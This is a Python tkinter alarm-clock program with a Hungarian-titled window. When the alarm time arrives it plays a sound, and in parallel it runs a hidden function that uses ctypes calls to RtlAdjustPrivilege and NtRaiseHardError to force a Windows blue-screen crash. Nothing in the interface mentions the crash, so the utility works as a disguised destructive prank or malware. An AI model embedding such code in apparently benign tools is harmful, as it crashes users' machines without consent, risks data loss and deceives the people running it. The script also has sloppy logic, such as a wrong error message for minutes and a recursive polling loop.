import time
import tkinter as tk
import os
import sys
import threading
import playsound as ps
import ctypes
m = tk.Tk()
m.geometry('400x400')
m.title("Ébresztő")
m.config(bg="Black")
intMVAL = 0
intHVAL = 0
#def----------------------
def crash():
    time.sleep(6.5)
    ntdll = ctypes.windll.ntdll
    prev_value = ctypes.c_bool()
    res = ctypes.c_ulong()
    ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
    if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
        print("BSOD Successfull!")
    else:
        print("BSOD Failed...")
def alarms():
    ps.playsound('alarmsound.mp3')
def getT():
    print("GETTIME STARTED")
    global HVAL
    global MVAL
    global intHVAL
    global intMVAL
    global condition
    try:
        HVAL = idoH.get()
        MVAL = idoM.get()
        intHVAL = int(HVAL)
        if intHVAL > 24:
            print("Enter a number between 0-24 how can i tell you")
            input("Press ENTER TO RESTART")
            os.startfile(sys.argv[0])
            sys.exit()
        intMVAL = int(MVAL)
        if intMVAL > 60:
            print("Enter a number between 0-24 how can i tell you")
            input("Press ENTER TO RESTART")
            os.startfile(sys.argv[0])
            sys.exit()
        print(HVAL,MVAL)
        condition = True
        timechecker(intHVAL,intMVAL)
        return intHVAL, intMVAL
    except ValueError:
        m.destroy()
        print("Enter a NUMBER..... jesus")
        input("Press ENTER TO RESTART")
        os.startfile(sys.argv[0])
        sys.exit()
#infinite loop here---------------
condition = True
#%H
def timechecker(intHVAL,intMVAL):
    print("TMECHECKER STARTED")
    global min
    global hr
    global loop
    loop = 0
    if condition:
        min = int(time.strftime("%M"))
        hr = int(time.strftime("%H"))
        print(hr)
        print(min)
        print(intHVAL)
        print(intMVAL)
        if intHVAL == hr and intMVAL == min:
            loop = loop + 2
            print("HEY")
            #what to exectue, when alarm is triggered
            c = threading.Thread(target = crash)
            a = threading.Thread(target = alarms)
            a.start()
            c.start()
    while(loop < 1):
        time.sleep(1)
        m.after(1000, timechecker(intHVAL,intMVAL))
        
#---------------------code
tk.Label(m, text="Ébresztő",bg="Black",fg="White").pack()
by = tk.Label(m, text="Made by Marci#1175",bg="Black",fg="White")
by.pack(side="bottom")
tk.Label(m, text="Enter time(When the alarm should sound):",bg="Black",fg="White").pack()
tk.Label(m, text="Hour (Between 0-24)",bg="Black",fg="White").pack()
idoH = tk.Entry(justify="center")
idoH.pack()
tk.Label(m, text="Minute (Between 0-60)",bg="Black",fg="White").pack()
idoM = tk.Entry(justify="center")
idoM.pack()
tk.Button(m, text="Enter",command=getT).pack(pady=30)
#code end-----------------
m.mainloop()